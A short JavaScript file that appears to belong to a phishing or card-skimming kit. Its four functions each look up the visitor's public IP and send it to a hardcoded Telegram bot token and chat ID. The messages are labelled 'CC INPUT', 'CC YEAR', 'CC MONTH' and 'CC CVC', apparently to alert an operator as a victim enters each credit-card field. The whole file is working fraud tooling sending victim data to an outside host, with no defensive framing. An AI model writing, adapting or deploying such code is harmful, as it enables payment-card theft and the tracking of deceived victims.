
const BOT_TOKEN  = "2142704123:AAHZyCvbJRKt7-tJezlGdWgx1X0Ue06wzJA"; // Replace with your Telegram Bot API key
const CHAT_ID  = "1634271322"; // Replace with the chat ID of the user or group you want to send the message to


function alerte() {
	fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
    // Extract the IP address from the JSON response
    const ip_address = data.ip;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=CC INPUT ...${ip_address}`;
        fetch(url);

})}
function alerte1() {
	fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
    // Extract the IP address from the JSON response
    const ip_address = data.ip;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=CC YEAR ...${ip_address}`;
        fetch(url);

})}
function alerte2() {
	fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
    // Extract the IP address from the JSON response
    const ip_address = data.ip;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=CC MONTH ...${ip_address}`;
        fetch(url);

})}  
function alerte3() {
	fetch('https://api.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
    // Extract the IP address from the JSON response
    const ip_address = data.ip;
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=CC CVC ...${ip_address}`;
        fetch(url);

})} 